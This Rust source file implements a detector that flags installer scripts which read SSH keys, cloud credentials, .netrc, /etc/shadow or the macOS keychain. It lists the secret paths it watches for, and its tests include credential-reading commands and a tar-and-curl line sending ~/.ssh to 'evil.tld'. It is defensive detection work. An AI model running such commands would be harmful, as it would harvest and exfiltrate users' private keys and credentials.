use crate::analysis::Flag;
use crate::config::NoConfig;
use crate::model::{Detail, Verdict};
use crate::parser::Command;
use crate::register_flag;

/// Files no legitimate installer needs to read.
const SECRET_FILES: &[&str] = &[
    "~/.ssh/id_rsa",
    "~/.ssh/id_ed25519",
    "~/.ssh/id_ecdsa",
    "~/.ssh/id_dsa",
    "~/.aws/credentials",
    "~/.config/gcloud/credentials",
    "~/.netrc",
    "~/.git-credentials",
    "~/.docker/config.json",
    "~/.kube/config",
    "~/.config/gh/hosts.yml",
    "~/.npmrc",
    "~/.pypirc",
    "/etc/shadow",
];
/// Commands that read a file's contents (as opposed to appending to it).
const READERS: &[&str] = &[
    "cat", "head", "tail", "cp", "base64", "xxd", "openssl", "gpg", "dd",
];
/// Archive/copy tools that can slurp a whole secret directory.
const ARCHIVERS: &[&str] = &["tar", "zip", "gtar", "rsync", "scp", "cp"];
/// Directories that hold nothing but secrets; reading the whole thing is theft.
const SECRET_DIRS: &[&str] = &["~/.ssh", "~/.gnupg", "~/.aws", "~/.config/gcloud"];

fn normalize(path: &str) -> String {
    path.trim_matches(['"', '\''])
        .replacen("${HOME}/", "~/", 1)
        .replacen("$HOME/", "~/", 1)
}

fn reads_secret(c: &Command) -> Option<String> {
    let paths = || c.args.iter().map(|w| normalize(&w.text));
    if READERS.contains(&c.name.as_str())
        && let Some(p) = paths().find(|p| {
            SECRET_FILES
                .iter()
                .any(|s| p == s || p.starts_with(&format!("{s}.")))
        })
    {
        return Some(p);
    }
    if ARCHIVERS.contains(&c.name.as_str()) {
        return paths().find(|p| {
            SECRET_DIRS
                .iter()
                .any(|d| p == d || p.starts_with(&format!("{d}/")))
                || SECRET_FILES.contains(&p.as_str())
        });
    }
    None
}

pub struct CredentialTheft {
    reported: bool,
}

impl Flag for CredentialTheft {
    fn visit_command(&mut self, c: &Command) -> Verdict {
        // `security dump-keychain` / `find-generic-password` on macOS.
        if c.name == "security"
            && c.arg_texts().any(|a| {
                a.contains("keychain")
                    || a == "find-generic-password"
                    || a == "find-internet-password"
            })
        {
            self.reported = true;
            return dead("reads the macOS keychain".into(), c.span.clone());
        }
        let Some(path) = reads_secret(c).filter(|_| !self.reported) else {
            return Verdict::Ignore;
        };
        self.reported = true;
        dead(
            format!("reads the private credential file `{path}`"),
            c.span.clone(),
        )
    }
}

fn dead(what: String, span: crate::model::Span) -> Verdict {
    Verdict::Dead(
        Detail::new(what, "An installer has no reason to read your private keys or credentials; this is how they are harvested.")
            .fix("Do not run this. Rotate any key it may have touched.")
            .at(span),
    )
}

register_flag! {
    id: "credential_theft",
    kind: Dead,
    category: Sensitive,
    description: "Reads SSH keys, cloud credentials, .netrc or the keychain",
    weight: 5,
    config: NoConfig,
    build: |_cfg, _shared| CredentialTheft { reported: false },
}

#[cfg(test)]
mod tests {
    use super::super::testing::*;
    use crate::model::FlagKind;

    #[test]
    fn detects_credential_reads() {
        assert_eq!(
            kind("credential_theft", "cat ~/.ssh/id_rsa"),
            Some(FlagKind::Dead)
        );
        assert_eq!(
            kind("credential_theft", "base64 \"$HOME/.aws/credentials\""),
            Some(FlagKind::Dead)
        );
        assert_eq!(
            kind("credential_theft", "security dump-keychain"),
            Some(FlagKind::Dead)
        );
        assert_eq!(
            kind(
                "credential_theft",
                "tar czf - ~/.ssh | curl -s -F f=@- https://evil.tld"
            ),
            Some(FlagKind::Dead)
        );
        assert_eq!(
            kind(
                "credential_theft",
                "tar czf - \"$HOME/.gnupg\" \"$HOME/.aws\""
            ),
            Some(FlagKind::Dead)
        );
        assert!(
            !fires("credential_theft", "cat ~/.ssh/known_hosts"),
            "known_hosts is not a secret"
        );
        assert!(!fires(
            "credential_theft",
            "echo key >> ~/.ssh/authorized_keys"
        ));
        assert!(
            !fires("credential_theft", "tar czf - ~/.local/share"),
            "ordinary dirs are fine"
        );
    }
}
